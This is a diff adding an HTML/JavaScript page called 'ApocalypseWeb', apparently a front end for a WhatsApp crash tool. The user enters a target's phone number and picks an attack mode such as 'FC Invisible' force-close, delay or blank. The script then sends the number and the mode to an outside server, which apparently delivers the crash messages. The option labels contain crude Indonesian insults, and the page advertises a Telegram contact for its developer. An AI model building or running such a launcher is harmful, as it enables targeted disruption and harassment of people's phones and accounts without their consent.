@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ApocalypseWeb</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    :root { --main: #ffffff; --second: #cccccc; --bg: #0e0e0e; --text: #eeeeee; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
+    body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative; }
+    #particles-js { position: fixed; width: 100%; height: 100%; z-index: 0; }
+    .glass-box { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 30px; backdrop-filter: blur(10px); box-shadow: 0 0 25px rgba(255, 255, 255, 0.2); z-index: 2; max-width: 450px; width: 100%; }
+    .profile { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
+    .profile img { width: 65px; height: 65px; border-radius: 50%; border: 2px solid var(--main); }
+    .profile-info h2 { font-size: 1.2rem; color: var(--main); }
+    .status { font-size: 0.9rem; color: #bbbbbb; }
+    .status i { color: #ffffff; margin-right: 5px; }
+    h1 { font-size: 1.4rem; color: var(--main); margin-bottom: 20px; text-align: center; animation: neon 2s infinite alternate; }
+    .neon { color: #0ff; text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 20px #0ff; animation: flicker 1.5s infinite alternate; }
+    @keyframes flicker { 0%,19%,21%,23%,25%,54%,56%,100% { opacity: 1; } 20%,24%,55% { opacity: 0.4; } }
+    input { background: rgba(255, 255, 255, 0.05); color: white; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 12px; width: 100%; margin-bottom: 10px; transition: 0.3s; }
+    input:focus { outline: none; border: 1px solid var(--main); background: rgba(255, 255, 255, 0.1); }
+    .bug-options { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+    .bug-card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 15px; padding: 12px 20px; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: 0.3s; }
+    .bug-card i { font-size: 1.2rem; color: #ffffff; }
+    .bug-card span { font-size: 1rem; color: white; }
+    .bug-card:hover { background: rgba(255, 255, 255, 0.1); transform: scale(1.03); }
+    .bug-card.active { border: 2px solid var(--main); box-shadow: 0 0 12px var(--main); }
+    button { background: linear-gradient(135deg, var(--main), var(--second)); border: none; color: black; width: 100%; padding: 14px; border-radius: 50px; font-size: 1rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 0 15px var(--main); transition: 0.3s; margin-top: 10px; }
+    .small-logout { background: rgba(255, 255, 255, 0.1); border: 1px solid var(--main); color: var(--main); font-size: 0.85rem; padding: 8px 16px; border-radius: 12px; margin-top: 10px; cursor: pointer; width: fit-content; display: block; margin-left: auto; margin-right: auto; }
+    .small-logout:hover { background: rgba(255, 255, 255, 0.2); }
+    #popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); display: flex; justify-content: center; align-items: center; z-index: 999; }
+    .popup-content { background: #1a1a1a; color: #00ff88; padding: 30px; border-radius: 15px; text-align: center; max-width: 90%; box-shadow: 0 0 20px #00ff88; animation: fadeIn 0.3s ease-in-out; position: relative; }
+    .popup-content .close-btn { position: absolute; top: 10px; right: 15px; font-size: 1.5rem; color: #ff4d4d; cursor: pointer; }
+    @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+  </style>
+</head>
+<body>
+<div id="particles-js"></div>
+
+<div id="popup" style="display:none;">
+  <div class="popup-content">
+    <span class="close-btn" onclick="closePopup()">&times;</span>
+    <p id="popup-message"></p>
+  </div>
+</div>
+
+<div class="glass-box" id="main-box">
+  <div class="profile">
+    <img src="https://files.catbox.moe/ktuerk.jpg" alt="profile">
+    <div class="profile-info">
+      <h2 id="userLabel">Api Bug</h2>
+      <span class="status"><i class="fas fa-circle"></i> Connected</span>
+    </div>
+  </div>
+  <h1 class="neon"><i class="fab fa-whatsapp"></i> Apocalypse</h1>
+  <input type="text" id="target" placeholder="628xxxx" />
+  <div class="bug-options">
+    <div class="bug-card active" data-bug="crashtotal"><i class="fas fa-skull-crossbones"></i><span>FC Invisible</span></div>
+    <div class="bug-card" data-bug="fc"><i class="fas fa-bomb"></i><span>kontol WA</span></div>
+    <div class="bug-card" data-bug="delay"><i class="fas fa-clock"></i><span>bangke Delay</span></div>
+    <div class="bug-card" data-bug="blank"><i class="fas fa-eye-slash"></i><span>mmk WhatsApp</span></div>
+  </div>
+  <button id="sendBtn" onclick="sendBug()"><i class="fas fa-bug"></i> Kirim Bug</button>
+  <div id="result" style="margin-top:10px;"></div>
+  <div class="contact" style="margin-top: 20px; color: white;">
+    <p>Contact Developer:</p>
+    <a href="https://t.me/leakvjs" target="_blank" style="color: #00acee;"><i class="fab fa-telegram"></i> @axpaw O`vovTzmxv</a>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+<script>
+particlesJS("particles-js", { particles: { number: { value: 60 }, color: { value: "#ffffff" }, shape: { type: "circle" }, opacity: { value: 0.4 }, size: { value: 3, random: true }, line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.3, width: 1 }, move: { enable: true, speed: 2 } }, interactivity: { events: { onhover: { enable: true, mode: "grab" } }, modes: { grab: { distance: 200, line_linked: { opacity: 1 } } } }, retina_detect: true });
+
+let selectedBug = "crashtotal";
+document.querySelectorAll(".bug-card").forEach(card => {
+  card.addEventListener("click", () => {
+    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
+    card.classList.add("active");
+    selectedBug = card.getAttribute("data-bug");
+  });
+});
+
+function closePopup() { document.getElementById("popup").style.display = "none"; }
+
+function showPopup(message) {
+  document.getElementById("popup-message").innerHTML = message;
+  document.getElementById("popup").style.display = "flex";
+}
+
+async function sendBug() {
+  const input = document.getElementById("target").value.trim();
+  const resDiv = document.getElementById("result");
+  const btn = document.getElementById("sendBtn");
+
+  if (!/^\d{5,15}$/.test(input)) {
+    resDiv.innerText = "Masukkan nomor WA yang valid!";
+    resDiv.style.color = "crimson";
+    return;
+  }
+
+  const chatId = `${input}@s.whatsapp.net`;
+  btn.disabled = true;
+  const originalHTML = btn.innerHTML;
+  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
+  resDiv.innerText = "";
+
+  try {
+    const response = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${encodeURIComponent(selectedBug)}`);
+    const json = await response.json();
+
+    if (json && json.status === 'success') {
+      showPopup(`✅ Bug berhasil dikirim ke <b>${input}</b>`);
+    } else {
+      resDiv.innerText = "❌ Gagal kirim bug.";
+      resDiv.style.color = "crimson";
+    }
+
+  } catch (err) {
+    resDiv.innerText = "❌ Gagal fetch: " + err.message;
+    resDiv.style.color = "crimson";
+  }
+
+  btn.disabled = false;
+  btn.innerHTML = originalHTML;
+}
+</script>
+</body>
+</html>
